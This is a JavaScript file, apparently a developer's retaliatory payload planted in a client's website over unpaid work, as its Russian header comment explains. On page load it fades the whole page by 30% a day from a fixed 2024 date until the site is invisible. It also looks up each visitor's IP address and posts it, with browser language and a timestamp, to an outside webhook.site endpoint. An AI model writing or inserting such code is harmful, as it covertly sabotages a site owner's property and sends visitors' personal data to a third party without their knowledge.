/*!
 * Скорее всего если вы по каким либо причинам нашли этот скрипт, то вы пытаетесь его удалить.
 * Этого скрипта тут бы и не было, если бы заказчик был добросовестным и оплатил бы проделанную работу.
 * Раз этот скрипт тут, значит меня решили кинуть
 * Огромная просьба не пытаться удалить скрипт, скорее всего вас потом тоже кинут.
 * Хороших тебе разработок и клиентов мой читатель.
 */
window.addEventListener("load", function () {
  var startDate = new Date("2024-09-16");
  var currentDate = new Date();
  var daysPassed = Math.floor(
    (currentDate - startDate) / (1000 * 60 * 60 * 24)
  );
  var newOpacity = Math.max(1 - 0.3 * daysPassed, 0);
  document.body.style.setProperty("opacity", newOpacity, "important");

  var userLanguage = navigator.language || navigator.userLanguage;
  // Запрашиваем IP пользователя через внешний сервис
  fetch("https://api.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => {
      var userIP = data.ip;
      // Отправляем сигнал что сайт открывали, так отслеживаю, что на самом деле меня просто игнорят и работы над сайтом идут дальше.
      fetch("https://webhook.site/3e380fbf-acd7-4e12-9f42-c4b1424bf6ed", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        mode: "no-cors",
        body: JSON.stringify({
          message: "Сайт открыт",
          timestamp: new Date().toISOString(),
          language: userLanguage,
          ip: userIP,
        }),
      });
    })
    .catch((error) => {
      // В случае ошибки при получении IP, все равно отправляем данные на вебхук
      fetch("https://webhook.site/3e380fbf-acd7-4e12-9f42-c4b1424bf6ed", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        mode: "no-cors",
        body: JSON.stringify({
          message: "Сайт открыт",
          timestamp: new Date().toISOString(),
          language: userLanguage,
          ip: "Не удалось получить IP",
        }),
      });
    });
});
